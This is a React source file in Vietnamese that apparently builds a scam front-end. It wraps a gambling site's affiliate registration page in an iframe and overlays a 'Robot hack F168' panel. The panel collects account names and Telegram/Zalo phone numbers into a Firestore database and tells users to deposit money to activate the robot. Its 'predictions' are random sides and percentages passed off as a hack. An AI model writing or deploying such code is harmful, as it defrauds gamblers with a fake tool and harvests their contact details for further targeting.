import React, { useState } from 'react';
import { Box, TextField, Button, Typography, Paper, Grid } from '@mui/material';
import { collection, addDoc } from 'firebase/firestore';
import { db } from './firebase';

function App() {
  const [username, setUsername] = useState('');
  const [contact, setContact] = useState('');
  const [type, setType] = useState(0);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, 'users'), {
        username,
        contact,
        type: 0,
        timestamp: new Date()
      });
      setIsSubmitted(true);
    } catch (error) {
      console.error('Error adding document: ', error);
    }
  };

  const getRandomResult = () => {
    const sides = ['Trái', 'Phải', 'Giữa'];
    const percentage = Math.floor(Math.random() * (93 - 70 + 1)) + 70;
    return `${sides[Math.floor(Math.random() * 3)]} ${percentage}%`;
  };

  return (
    <div style={{ width: '100%', height: '100vh' }}>
      <iframe
        src="https://f16878.vip/home/register?id=704131509&currency=VND"
        style={{ width: '100%', height: '100%', border: 'none' }}
        title="F168 Frame"
      />
      
      <Paper
        elevation={3}
        style={{
          position: 'fixed',
          top: '20px',
          right: '20px',
          padding: '20px',
          width: '300px',
          zIndex: 1000,
          backgroundColor: 'white'
        }}
      >
        {!isSubmitted ? (
          <form onSubmit={handleSubmit}>
            <Typography variant="h5" gutterBottom>
              Robot hack F168
            </Typography>
            <TextField
              fullWidth
              label="Tên tài khoản"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              margin="normal"
              required
            />
            <TextField
              fullWidth
              label="Số điện thoại Telegram/Zalo"
              value={contact}
              onChange={(e) => setContact(e.target.value)}
              margin="normal"
              required
            />
            <Button
              type="submit"
              variant="contained"
              color="primary"
              fullWidth
              style={{ marginTop: '20px' }}
            >
              Bắt đầu
            </Button>
          </form>
        ) : (
          <Grid container spacing={2}>
            <Grid item xs={4}>
              <Box textAlign="center">
                <img
                  src="https://via.placeholder.com/100"
                  src="/icon.png"
                  alt="Avatar"
                  style={{ width: '100%', borderRadius: '50%' }}
                />
                <Button
                  variant="contained"
                  color="secondary"
                  fullWidth
                  style={{ marginTop: '10px' }}
                  onClick={() => setIsSubmitted(false)}
                >
                  Kết thúc
                </Button>
              </Box>
            </Grid>
            <Grid item xs={8}>
              <Typography variant="body1">
                {type === 0
                  ? "Vui lòng nạp tiền để kích hoạt robot"
                  : `Kết quả: ${getRandomResult()}`}
              </Typography>
            </Grid>
          </Grid>
        )}
      </Paper>
    </div>
  );
}

export default App; 